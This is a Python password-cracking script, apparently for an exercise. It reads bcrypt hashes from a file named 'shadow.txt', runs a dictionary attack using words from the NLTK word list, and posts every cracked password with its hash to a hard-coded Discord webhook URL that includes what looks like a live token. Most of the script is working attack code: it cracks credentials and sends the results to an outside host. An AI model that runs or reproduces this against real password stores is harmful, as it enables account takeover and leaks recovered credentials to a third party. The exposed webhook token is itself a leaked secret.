from nltk.corpus import words
from bcrypt import hashpw
import requests


work_factors = ["$08$", "$09$", "$10$", "$11$", "$12$", "$13$"]

# Read the hashes from the shadow file
hashes = None
with open("shadow.txt", "r") as shadow:
    hashes = shadow.readlines()

wl = words.words()
wl = list(filter(lambda element: 6 <= len(element) <= 10, wl))
print(len(wl))

for wf in work_factors:
    print("Doing work factor: " + wf)
    current_hashes = list(filter(lambda element: wf in element, hashes))
    print("Current hashes:")
    print(current_hashes)
    trunc_hashes = list(map(lambda element: element.split(":")[1].strip(), current_hashes))

    trunc_encoded = list(map(lambda element: element.encode("utf-8"), trunc_hashes))

    print(trunc_encoded)

    salt = trunc_hashes[0][:29]
    salt_encoded = salt.encode("utf-8")

    for word in wl:
        word_encoded = word.encode("utf-8")
        word_hashed = hashpw(word_encoded, salt_encoded)
        for h in trunc_encoded:
            if word_hashed == h:
                message = {"content": "Success for `" + h.decode("utf-8") + "`!" + "\n" + word}
                print("Success for `" + h.decode("utf-8") + "`!" + "\n" + word)
                requests.post("https://discord.com/api/webhooks/1102392438380834839/zjb-ytg7HoIVsIKpRri3X3kZ2SUOrpbnCTmYn_lG0BvKRF9k4pax50qiiqzsdrlYgwfL", data=message)
                trunc_encoded.remove(h)

        if len(trunc_encoded) == 0:
            break
